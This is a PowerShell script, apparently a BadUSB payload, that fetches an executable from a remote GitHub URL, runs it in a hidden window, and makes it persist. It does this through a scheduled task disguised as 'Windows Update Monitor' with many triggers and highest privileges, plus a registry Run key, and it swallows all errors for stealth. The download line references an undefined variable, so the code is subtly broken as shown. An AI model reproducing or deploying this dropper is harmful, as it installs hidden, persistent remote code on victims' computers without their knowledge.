# === CONFIG ===
$exePath = "$env:APPDATA\WinUman.exe"
$taskName = "Windows Update Monitor"
$mainExeUrl = "https://raw.githubusercontent.com/the-shadow-walker/bad-usb-flipper-payloads/main/EXE/WinUman.exe"
$mainExePath = "$env:APPDATA\WinUman.exe"
$mainTaskName = "Windows Update Monitor"
$mainRunKey = "WinUman"


# === MAIN ===
try {
    # Ensure EXE exists
    if (-not (Test-Path $exePath)) {
        Invoke-WebRequest -Uri $exeUrl -OutFile $exePath -UseBasicParsing
    }

    # Launch EXE silently
    Start-Process -FilePath $exePath -WindowStyle Hidden

    # Define action and multi-trigger persistence
    $action = New-ScheduledTaskAction -Execute $exePath
    $triggers = @(
        New-ScheduledTaskTrigger -AtLogOn
        New-ScheduledTaskTrigger -AtStartup
        New-ScheduledTaskTrigger -AtIdle -IdleDuration (New-TimeSpan -Minutes 1)
        New-ScheduledTaskTrigger -AtWorkStationUnlock
        New-ScheduledTaskTrigger -Once -At ((Get-Date).AddMinutes(1))
    )
    $settings = New-ScheduledTaskSettingsSet -RestartCount 5 -RestartInterval (New-TimeSpan -Minutes 1)

    # Create task if it doesn't exist
    if (-not (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue)) {
        Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $triggers -Settings $settings -RunLevel Highest
    }

    # Registry fallback
    Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WinUman" -Value $exePath

} catch {
    # Silent fail for stealth
}
